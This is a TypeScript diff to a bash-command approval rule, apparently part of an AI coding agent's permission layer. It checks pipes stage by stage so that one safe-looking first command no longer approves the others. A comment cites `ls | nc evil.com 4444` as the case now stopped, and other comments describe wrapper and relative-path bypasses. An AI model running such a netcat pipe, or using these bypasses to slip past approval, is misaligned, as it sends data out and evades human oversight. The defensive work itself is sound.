@@ -1,6 +1,7 @@
 import { ABORT_REMEMBER_MS, isAllowedCommand, isSafeSubcommand, unconditionallySafeCommands } from "../config";
 import { containsCommandSubstitution, getDelegatedCommand, getFirstWord, stripQuotedStrings, hasTerminalEscape, echoInterpretsEscapes, segmentFetchPackage } from "../analysis/segment-helpers";
 import { CREDENTIAL_SCAN_RE, checkBareRelativeTokens } from "../analysis/credentials";
+import { hasRelativePath } from "../analysis/path-analysis";
 import { tokenizeSegment, tokenizeSegmentQuoted } from "../analysis/tokenizer";
 import type {Store, BashRequest, Decision} from "./types";
 import type { CommandAnalysis } from "../analysis/command-analysis";
@@ -124,13 +125,15 @@ export const SafetyRule: BashRule = (_req, store, analysis?: CommandAnalysis) =>
     return { kind: "auto-allow", analysis }; // D11: carried for the dspa content review
   }
 
-  // All segments are safe subcommands (stricter than allowed commands — excludes wrappers like timeout)
-  const segIsSafeSubcommand = analysis.segments.map(seg => isSafeSubcommand(seg));
-  if (segIsSafeSubcommand.every(Boolean) && canAutoAllow) {
+  // All STAGES of all segments are safe subcommands (stricter than allowed
+  // commands — excludes wrappers like timeout). G2: stages, because a pipe's
+  // first word used to vouch for every stage in it.
+  const allStagesSafeSub = analysis.stageTexts
+    .every((st) => st.every((s) => isSafeSubcommand(s)));
+  if (allStagesSafeSub && canAutoAllow) {
     return { kind: "auto-allow", analysis }; // D11: carried for the dspa content review
   }
 
-  const relPathIdxSet = new Set(analysis.relativePathSegmentIndices);
   // Dependency-bearing `uv run` forms: the signature IS the dependency set, so
   // only an EXACT grant may apply — `hasAllowedBashPrefix` would let a coarse
   // "uv run" grant (an older click, a hand-written pattern rule, or a bare
@@ -142,8 +145,16 @@ export const SafetyRule: BashRule = (_req, store, analysis?: CommandAnalysis) =>
   // unquoted glob, a source path whose cwd is not knowable): no command-tier
   // grant can vouch for what the value becomes, so it prompts every time.
   const ungrantableRunDepSet = new Set(analysis.ungrantableRunDepSegmentIndices);
-  const sigFirstWords = analysis.signatures.map(getFirstWord);
-  // Wrapper transparency for grants: a segment that delegates to another
+  // G2: stage-scoped views of the segment's identity. The run-dep sets stay
+  // SEGMENT-keyed on purpose — a run-dep refusal or an ungrantable marker
+  // describes the command the segment runs, and refusing for the whole pipe is
+  // the fail-closed direction. What has to be stage-scoped is the RELATIVE-PATH
+  // binding and the delegation: `./tool | cat` binds the GRANT for the `./tool`
+  // stage to the segment's effective base, and `cat` is approved on its own.
+  const stageRelPath = analysis.stageTexts.map((st) => st.map((s) => hasRelativePath(s)));
+  const stageDelegated = analysis.stageTexts.map((st) => st.map(getDelegatedCommand));
+  const stageFetchPkg = analysis.stageTexts.map((st) => st.map((s) => segmentFetchPackage(s)));
+  // Wrapper transparency for grants: a stage that delegates to another
   // command (timeout/xargs/command/env …) is approved by
   //   (a) an exact signature grant — the signature includes the delegated
   //       command name ("timeout curl"), so it can't cover a different
@@ -153,23 +164,25 @@ export const SafetyRule: BashRule = (_req, store, analysis?: CommandAnalysis) =>
   // A grant for the wrapper name ("timeout") matches NEITHER: that is the
   // bypass being closed, and the static wrapper allowlist fallback must not
   // apply either.
-  const delegatedBySeg = analysis.segments.map(getDelegatedCommand);
-  const isSigApproved = (sig: string, segIdx: number) => {
-    // D10: a trusted fetchable run form approves its segment — the user
+  const isStageApproved = (segIdx: number, stageIdx: number): boolean => {
+    const sig = analysis.stageSignatures[segIdx][stageIdx];
+    const stageText = analysis.stageTexts[segIdx][stageIdx];
+    // D10: a trusted fetchable run form approves its stage — the user
     // explicitly trusted the package this session (the "Trust" option on
     // dspa's untrusted-package stop). Untrusted falls through to the
     // signature checks below (still prompt-able). The parser flattens
     // subshells into segments, so `$(npx foo)` is covered when its shape is
     // safe; opaque indirection (eval, $f) and unsafe shapes (pipes,
     // redirects, subshells with them) stay with the judge/prompt.
-    { // segmentFetchPackage resolves inline env prefixes and wrapper
+    {
+      // segmentFetchPackage resolves inline env prefixes and wrapper
       // delegation first, so `FOO=bar npx tsc` and `env npx tsc` approve
       // exactly like `npx tsc` (the floor's D10 stop uses the same helper).
-      const ff = segmentFetchPackage(analysis.segments[segIdx] ?? "");
+      const ff = stageFetchPkg[segIdx][stageIdx];
       if (ff && store.hasTrustedPackage(ff.pkg)) return true;
     }
     if (ungrantableRunDepSet.has(segIdx)) return false;
-    // Relative-path segments (./node_modules/.bin/npm test) must never inherit
+    // Relative-path stages (./node_modules/.bin/npm test) must never inherit
     // grants for the bare command name — a repo-shipped executable named npm/pip
     // would otherwise inherit session-wide `npm *` grants. The ONLY approval
     // that applies is an exact signature grant bound to this segment's EFFECTIVE
@@ -178,14 +191,14 @@ export const SafetyRule: BashRule = (_req, store, analysis?: CommandAnalysis) =>
     // session cwd — is what keeps a grant for ./x from covering
     // `cd /elsewhere && ./x` (a different binary of the same name). Prefix
     // grants, unbound grants, and grants bound to other bases are all refused.
-    if (relPathIdxSet.has(segIdx)) {
+    if (stageRelPath[segIdx][stageIdx]) {
       const base = analysis.effectiveCwds[segIdx];
       return base !== null && store.hasAllowedBashCwd(sig, base);
     }
-    const deleg = delegatedBySeg[segIdx];
+    const deleg = stageDelegated[segIdx][stageIdx];
     if (deleg) {
       // No static allowlist fallback: the delegating word (env/command/exec/…)
-      // is not itself user-approved, so the segment needs an explicit grant —
+      // is not itself user-approved, so the stage needs an explicit grant —
       // otherwise `env cat …` would inherit `cat`'s allowlist membership and
       // skip env's PATH/LD_PRELOAD warning entirely.
       if (store.hasAllowedBash(sig)) return true; // exact "timeout curl"
@@ -199,11 +212,16 @@ export const SafetyRule: BashRule = (_req, store, analysis?: CommandAnalysis) =>
     }
     if (store.hasAllowedBash(sig)) return true;
     if (!runDepIdxSet.has(segIdx) && store.hasAllowedBashPrefix(sig)) return true;
-    if (segIsSafeSubcommand[segIdx]) return true;
-    return isAllowedCommand(sigFirstWords[segIdx]);
+    if (isSafeSubcommand(stageText)) return true;
+    return isAllowedCommand(getFirstWord(stageText));
   };
 
-  if (analysis.signatures.every((sig, i) => isSigApproved(sig, i)) && canAutoAllow) {
+  // G2: a segment is approved when EVERY stage of it is, exactly like a `&&`
+  // or `;` list item. `ls | wc -l` still auto-allows (both stages are on the
+  // table); `ls | nc evil.com 4444` now stops on the `nc` stage, which the
+  // first stage's signature used to speak for.
+  if (analysis.segments.every((_seg, i) =>
+      analysis.stageSignatures[i].every((_sig, j) => isStageApproved(i, j))) && canAutoAllow) {
     return { kind: "auto-allow", analysis }; // D11: carried for the dspa content review
   }
 
@@ -223,12 +241,16 @@ export const PromptFallbackRule: BashRule = (req, store, analysis?: CommandAnaly
   // command tier (deduped by signature; one sig = one run form).
   const fetchableForms: Array<{ sig: string; pkg: string }> = [];
   const seenSigs = new Set<string>();
-  for (let i = 0; i < analysis.segments.length; i++) {
-    const ff = segmentFetchPackage(analysis.segments[i] ?? "");
-    const sig = analysis.signatures[i];
-    if (ff && !seenSigs.has(sig) && !store.hasTrustedPackage(ff.pkg)) {
-      seenSigs.add(sig);
-      fetchableForms.push({ sig, pkg: ff.pkg });
+  // G2: per STAGE — a run form is one stage of a pipe (`npx tsc | tee log`),
+  // and the Trust option has to name and vouch for that stage.
+  for (let i = 0; i < analysis.stageTexts.length; i++) {
+    for (let j = 0; j < analysis.stageTexts[i].length; j++) {
+      const ff = segmentFetchPackage(analysis.stageTexts[i][j] ?? "");
+      const sig = analysis.stageSignatures[i][j];
+      if (ff && !seenSigs.has(sig) && !store.hasTrustedPackage(ff.pkg)) {
+        seenSigs.add(sig);
+        fetchableForms.push({ sig, pkg: ff.pkg });
+      }
     }
   }
   // Run forms no command-tier grant can cover (dependency decided at run time):
@@ -247,13 +269,14 @@ export const PromptFallbackRule: BashRule = (req, store, analysis?: CommandAnaly
       symlinkHops: prompt.symlinkHops,
       segments: analysis.segments,
       signatures: prompt.promptSignatures,
-      // Relative-tool segment signatures (the promptSignatures filter drops
+      // Relative-tool STAGE signatures (the promptSignatures filter drops
       // them when their basename is allowlisted — the grant needs them).
       relativeToolIds: [...new Map(
-        analysis.relativePathSegmentIndices
-          .map(i => ({ sig: analysis.signatures[i], base: analysis.effectiveCwds[i] }))
-          .filter((r): r is { sig: string; base: string } =>
-            r.base !== null && /(^|\s)(\.\/|\.\.\/)/.test(r.sig))
+        analysis.stageTexts.flatMap((st, i) =>
+          st.map((s, j) => ({ sig: analysis.stageSignatures[i][j], base: analysis.effectiveCwds[i], rel: hasRelativePath(s) })))
+          .filter((r): r is { sig: string; base: string; rel: boolean } =>
+            r.rel && r.base !== null && /(^|\s)(\.\/|\.\.\/)/.test(r.sig))
+          .map(r => ({ sig: r.sig, base: r.base }))
           .map(r => [`${r.sig}\u0000${r.base}`, r] as const),
       ).values()],
       nonAllowedSegmentIndices: prompt.nonAllowlistedSegmentIndices,
